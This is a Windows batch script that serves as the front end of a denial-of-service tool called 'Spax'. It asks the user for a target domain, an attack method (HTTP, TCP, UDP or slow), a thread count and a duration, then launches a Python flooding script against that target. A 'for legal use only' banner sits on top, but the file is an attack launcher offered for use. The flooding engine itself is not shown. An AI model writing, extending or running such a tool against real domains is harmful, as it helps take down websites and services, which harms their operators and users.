@echo off
chcp 65001 > nul
title Spax

:start
cls
color 0c


echo  ▄████████    ▄███████▄    ▄████████ ▀████    ▐████▀
echo  ███    ███   ███    ███   ███    ███   ███▌   ████▀
echo  ███    █▀    ███    ███   ███    ███    ███  ▐███
echo  ███          ███    ███   ███    ███    ▀███▄███▀
echo ▀███████████ ▀█████████▀  ▀███████████    ████▀██▄
echo        ███   ███          ███    ███   ▐███  ▀███
echo   ▄█    ███   ███          ███    ███  ▄███     ███▄
echo ▄████████▀   ▄████▀        ███    █▀  ████       ███▄
echo.
echo !!FOR LEGAL USE ONLY!!
echo Made by. Kaiser
echo.
echo ==========================================================
echo.


set "TARGET="
set /p TARGET="target domain (orn: bombo.com): "
if not defined TARGET (
    echo. & echo [HATA] Hedef adresi girmek zorunludur. & timeout /t 2 > nul & goto start
)

set "METHOD=http"
set /p METHOD_INPUT="Attack vector (http,tcp,udp,slow) [Default: http]: "
if defined METHOD_INPUT set "METHOD=%METHOD_INPUT%"

set "THREADS=50"
set /p THREADS_INPUT="Thread count [Default: 50]: "
if defined THREADS_INPUT set "THREADS=%THREADS_INPUT%"

set "SECONDS_ARG="
set "SECONDS_DISPLAY=Unlimited"
set /p SECONDS_INPUT="Attack duration (seconds, leave blank for unlimited): "
if defined SECONDS_INPUT (
    set "SECONDS_ARG=-s %SECONDS_INPUT%"
    set "SECONDS_DISPLAY=%SECONDS_INPUT% Second"
)


cls
echo ==========================================================
echo Attack is starting...
echo.
echo   - Target   : %TARGET%
echo   - Method  : %METHOD%
echo   - Therad  : %THREADS%
echo   - Second    : %SECONDS_DISPLAY%
echo.
echo ==========================================================
echo.


python spax.py -d %TARGET% -m %METHOD% -t %THREADS% %SECONDS_ARG% --quiet


if %ERRORLEVEL% neq 0 (
    echo.
    echo ==========================================================
    echo [ERROR] You entered an invalid parameter.
    echo Please check the attack method or other inputs.
    echo ==========================================================
    pause
    goto start
)

:end
echo.
echo ==========================================================
echo Script completed. Press any key to close the window.
echo ==========================================================
pause > nul
